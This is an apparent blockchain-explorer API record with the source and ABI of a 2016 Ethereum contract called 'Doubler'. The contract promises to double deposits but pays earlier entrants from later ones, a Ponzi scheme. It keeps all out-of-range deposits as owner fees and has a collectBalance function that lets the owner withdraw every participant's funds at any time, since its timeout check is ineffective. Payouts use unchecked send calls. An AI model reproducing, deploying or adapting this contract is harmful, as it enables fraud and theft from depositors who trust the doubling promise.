{"status":"1","message":"OK","result":[{"SourceCode":"contract Doubler{\r\n\r\n    struct Participant {\r\n        address etherAddress;\r\n        uint PayAmount;\r\n    }\r\n\r\n    Participant[] public participants;\r\n\r\n    uint public payoutIdx = 0;\r\n    uint public collectedFees = 0;\r\n    uint public balance = 0;\r\n\tuint public timeout = now + 1 weeks;\r\n\r\n    address public owner;\r\n\r\n\r\n    // simple single-sig function modifier\r\n    modifier onlyowner { if (msg.sender == owner) _ }\r\n\r\n    // this function is executed at initialization and sets the owner of the contract\r\n    function Doubler() {\r\n\t\tcollectedFees += msg.value;\r\n        owner = msg.sender;\r\n    }\r\n\r\n    // fallback function - simple transactions trigger this\r\n    function() {\r\n        enter();\r\n    }\r\n    \r\n    function enter() {\r\n\t\t//send more than 0.1 ether and less than 50, otherwise loss all\r\n\t\tif (msg.value >= 100 finney && msg.value <= 50 ether) {\r\n\t        // collect fees and update contract balance\r\n\t        collectedFees += msg.value / 20;\r\n\t        balance += msg.value - msg.value / 20;\r\n\t\r\n\t      \t// add a new participant to array and calculate need balance to payout\r\n\t        uint idx = participants.length;\r\n\t        participants.length += 1;\r\n\t        participants[idx].etherAddress = msg.sender;\r\n\t        participants[idx].PayAmount = 2 * (msg.value - msg.value / 20);\r\n\t\t\t\r\n\t\t\tuint NeedAmount = participants[payoutIdx].PayAmount;\r\n\t\t\t// if there are enough ether on the balance we can pay out to an earlier participant\r\n\t\t    if (balance >= NeedAmount) {\r\n\t            participants[payoutIdx].etherAddress.send(NeedAmount);\r\n\t\r\n\t            balance -= NeedAmount;\r\n\t            payoutIdx += 1;\r\n\t        }\r\n\t\t}\r\n\t\telse {\r\n\t\t\tcollectedFees += msg.value;\r\n            return;\r\n\t\t}\r\n    }\r\n\r\n\tfunction NextPayout() {\r\n        balance += msg.value;\r\n\t\tuint NeedAmount = participants[payoutIdx].PayAmount;\r\n\r\n\t    if (balance >= NeedAmount) {\r\n            participants[payoutIdx].etherAddress.send(NeedAmount);\r\n\r\n            balance -= NeedAmount;\r\n            payoutIdx += 1;\r\n        }\r\n    }\r\n\r\n    function collectFees() onlyowner {\r\n\t\tcollectedFees += msg.value;\r\n        if (collectedFees == 0) return;\r\n\r\n        owner.send(collectedFees);\r\n        collectedFees = 0;\r\n    }\r\n\r\n    function collectBalance() onlyowner {\r\n\t\tbalance += msg.value;\r\n        if (balance == 0 && now > timeout) return;\r\n\r\n        owner.send(balance);\r\n        balance = 0;\r\n    }\r\n\r\n    function setOwner(address _owner) onlyowner {\r\n\t\tcollectedFees += msg.value;\r\n        owner = _owner;\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"setOwner\",\"outputs\":[],\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"participants\",\"outputs\":[{\"name\":\"etherAddress\",\"type\":\"address\"},{\"name\":\"PayAmount\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"timeout\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"collectBalance\",\"outputs\":[],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"collectedFees\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"payoutIdx\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"NextPayout\",\"outputs\":[],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"balance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"collectFees\",\"outputs\":[],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"enter\",\"outputs\":[],\"type\":\"function\"},{\"inputs\":[],\"type\":\"constructor\"}]","ContractName":"Doubler","CompilerVersion":"v0.2.1-2016-01-30-91a6b35","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":""}]}